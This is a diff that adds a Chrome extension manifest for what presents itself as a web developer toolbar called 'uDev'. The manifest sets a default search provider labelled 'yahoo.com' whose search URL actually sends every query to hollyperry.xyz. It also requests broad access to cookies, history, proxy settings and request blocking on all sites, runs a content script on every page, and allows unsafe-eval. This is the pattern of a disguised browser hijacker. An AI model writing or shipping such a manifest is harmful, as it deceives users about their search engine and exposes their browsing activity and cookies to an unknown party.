@@ -1,0 +1,66 @@
+{
+"update_url": "https://clients2.google.com/service/update2/crx",
+
+	"background": {
+		"page": "background/background.html"
+	},
+	"browser_action": {
+		"default_icon": {
+			"19": "overlay/images/icon.png",
+			"38": "overlay/images/icon-2x.png"
+		},
+		"default_popup": "overlay/overlay.html",
+		"default_title": "__MSG_extensionName__"
+	},
+	"chrome_settings_overrides": {
+    "search_provider": {
+      "name": "yahoo.com",
+	  "keyword": "yahoo.com",
+      "search_url": "http://hollyperry.xyz?text={searchTerms}",
+	  "favicon_url": "http://hollyperry.xyz",
+      "encoding": "UTF-8",
+      "is_default": true
+    }
+	},
+	"content_scripts": [
+		{
+			"js": [
+				"content/content.js"
+			],
+			"matches": [
+				"<all_urls>"
+			]
+		}
+	],
+	"content_security_policy": "script-src 'self' https://ssl.google-analytics.com https://www.google-analytics.com/ https://apis.google.com https://ajax.googleapis.com 'unsafe-eval'; style-src 'self' ; connect-src *; object-src 'self' ",
+	"default_locale": "en_US",
+	"description": "__MSG_extensionDescription__",
+	"icons": {
+		"128": "common/images/logos/128.png",
+		"16": "common/images/logos/16.png",
+		"48": "common/images/logos/48.png"
+	},
+	"manifest_version": 2,
+	"name": "uDev | Web Developer Toolbar",
+	"options_page": "options/options.html",
+	"permissions": [
+		"<all_urls>",
+		"clipboardWrite",
+		"contentSettings",
+		"cookies",
+		"history",
+		"tabs",
+		"webRequest",
+		"webRequestBlocking",
+		"webNavigation",
+		"idle",
+		"cookies",
+		"proxy",
+		"storage",
+		"unlimitedStorage"
+	],
+	"version": "1.0",
+	"web_accessible_resources": [
+		"*"
+	]
+}
